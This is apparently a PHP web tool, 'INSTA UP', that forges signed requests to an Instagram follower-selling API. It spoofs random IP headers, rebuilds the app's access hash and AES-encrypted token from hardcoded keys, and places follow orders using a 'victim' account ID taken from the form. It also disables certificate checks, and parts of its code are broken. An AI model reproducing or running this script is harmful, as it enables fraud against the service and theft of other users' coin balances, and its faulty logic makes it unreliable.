<html>
   <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
      <script src="https://kit.fontawesome.com/55db5a83a3.js" crossorigin="anonymous"></script>
      <style>
         .btn {
         background-color:black;
         color: #FFFFFF;
         border-radius:10px;
         border:solid;
         }
      .form-control {
         background-color:whitesmoke;
         color: #000000;
         border-radius:10px;
         border:solid;
         }
      </style>
   </head>
   <body>
   	<center>
     <?php
error_reporting(0);
echo"<form action='' method='get'>
<font color='black' size='5'><bold><hr class='hr-19'>INSTA UP<hr class='hr-19'><bold>";

if(isset($_GET['submit'])){
	$uidx=$_GET['uid'];
    $uid=$_GET['oid'];
 
    
  function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/order/coins';



$data0='market=Bazaar&user_id='.$uid.'&iad='.$x40.'&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['market: Bazaar',
'access: '.$access,
'lng: en',
'api_key: ABCXYZ123TEST',
"Nagent: null/02:00:00:00:00:00/'.$ts.'/$x16/null/$x40",
'cnt: unknown',
'version: 51',
'pkg: f2c6d7a5b030a1542f7eb589d5013340',
'aid: '.$x40,
'Content-Type: application/x-www-form-urlencoded',
'Host: instaup.marsapi.com',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.12.1',
'X-Forwarded-For: '.$ipz.''];


	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
	   curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	$output1= curl_exec ($ch);
	
	curl_close ($ch);

    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
  if( $d2 % 2 == 0)
  	$d2 = $d2;
else
  	$d2 - 1;
      $url0="https://instaup.marsapi.com/get_likes/order/follow";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';




$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "<div class='success'><center>
<font color='limegreen'><hr>DONE : $d2<hr></font></center></div>";
} else {

echo "<div class='success'><center>
<font color='red' size='5px'><hr>$cc<hr></font></center></div>";
}
	    }
	if(!isset($_GET['Submit'])){
echo"<form action='' method='get'>
<input type='text' name='oid'  class='text' placeholder='ايدي الضحية ' required><br><br>
<input type='text' name='uid'  class='text' placeholder='ايدي حسابك على الانستغرام ' required><br><br>";
echo "<input type='submit' class='submit' name='submit' value='submit'>";
}
	?>
</center>
<div id='formFooter'>
<center><script type="text/javascript">(function() {var script=document.createElement("script");script.type="text/javascript";script.async =true;script.src="//telegram.im/widget-button/index.php?id=@xeztx";document.getElementsByTagName("head")[0].appendChild(script);})();</script>
<a href="https://www.instagram.com/x169c" target="_blank" class="telegramim_button telegramim_shadow telegramim_pulse" style="font-size:30px;width:399px;background:#84ff00;box-shadow:1px 1px 5px #0b5394;color:#6f00ff;border-radius:100px;" title="BY - MODY "><i></i> Dont forget to follow me <small><span class='telegramim_count'></a>
</center>
  </body>
</html>


